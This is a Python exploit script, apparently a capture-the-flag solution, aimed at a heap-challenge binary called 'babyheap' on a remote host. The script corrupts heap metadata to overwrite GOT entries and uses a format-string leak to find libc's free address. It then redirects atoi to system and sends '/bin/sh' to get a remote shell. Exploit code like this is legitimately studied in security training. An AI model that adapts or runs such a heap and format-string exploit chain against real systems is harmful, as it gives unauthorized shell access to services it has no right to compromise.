#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'localhost','port':8080}, \
                        remote  = {'host':'52.68.77.85','port':8731})
env.select()

binf = ELF('babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b', rop=True)
libc = ELF('libc.so.6_375198810bb39e6593a968fcbcf6556789026743')
addr_got_free       = binf.got('free')
addr_got_exit       = binf.got('_exit')

addr_plt_puts       = binf.plt('puts')
addr_plt_printf     = binf.plt('printf')
addr_plt_alarm      = binf.plt('alarm')
addr_plt_read       = binf.plt('read')

#==========
def attack(cmn):
    bh = BabyHeap(cmn)

    chunk_1  = 'nn'
    chunk_1 += '\x00'*(0x1000-0x18-len(chunk_1))
    chunk_1 += pack_64(0x50)
    bh.Exit(chunk_1)

    chunk_3  = pack_64(0)
    chunk_3 += pack_64(0x21)
    bh.New(0x80, chunk_3, 'A'*8)
    
    bh.Delete()

    rewrite_got  = pack_64(addr_plt_alarm)      # _exit
    rewrite_got += pack_64(addr_plt_read)       # __read_chk
    rewrite_got += pack_64(addr_plt_puts+6)     # puts
    rewrite_got += pack_64(0xdeadbeef)
    rewrite_got += pack_64(addr_plt_printf+6)   # printf
    rewrite_got += pack_64(addr_plt_alarm+6)    # alarm
    rewrite_got += pack_64(addr_plt_read+6)     # read
    rewrite_got += pack_64(0xdeadbeef)
    rewrite_got += pack_64(0xdeadbeef)
    rewrite_got += pack_64(0xdeadbeef)
    rewrite_got += pack_64(0xdeadbeef)
    rewrite_got += pack_64(addr_plt_printf)     # atoi
    
    chunk_2  = '\x00'*0x20
    chunk_2 += pack_64(len(rewrite_got))        # size
    chunk_2 += pack_64(0)                       # name (over written)
    chunk_2 += pack_64(addr_got_exit)           # &content
    bh.New(0x48, chunk_2, 'name')
    
    bh.Edit(rewrite_got)                        # got_exit <- alarm, got_atoi <- printf

    cmn.read_until('Your choice:')
    cmn.send('%9$s!!  '+pack_64(addr_got_free)) # FSB
    addr_libc_free = cmn.read_until('!!', contain=False)
    addr_libc_free = unpack_64(addr_libc_free+'\x00'*(8-len(addr_libc_free)))
    info('addr_libc_free    = 0x%08x' % addr_libc_free)

    libc.set_location('free', addr_libc_free)
    addr_libc_system    = libc.function('system')
    info('addr_libc_system  = 0x%08x' % addr_libc_system)

    rewrite_got  = rewrite_got[:-8]
    rewrite_got += pack_64(addr_libc_system)    # atoi
    bh.Edit(rewrite_got)                        # alarm(0), got_atoi <- system

    cmn.read_until('Your choice:')
    cmn.send('/bin/sh\0')

#==========

class BabyHeap:
    def __init__(self, cmn):
        self._read       = cmn.read
        self._read_until = cmn.read_until
        self._send       = cmn.send
        self._sendln     = cmn.sendln

    def New(self, size, content, name):
        self._read_until('Your choice:')
        self._send('1')

        prompt = self._read(6)
        if 'Size' in prompt:
            self._sendln(str(size))
            self._read_until('Content:')
            self._send(content)
            self._read_until('Name:')
            self._send(name)
        else:
            fail('Remote program is exited')

    def Delete(self):
        self._read_until('Your choice:')
        self._send('2 ')
        
    def Edit(self, content):
        self._read_until('Your choice:')
        self._send('3  ')

        self._read(7)
        self._send(content)

    def Exit(self, ans):
        self._read_until('Your choice:')
        self._send('4   ')
        self._read_until('(Y/n)')
        self._sendln(ans)
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
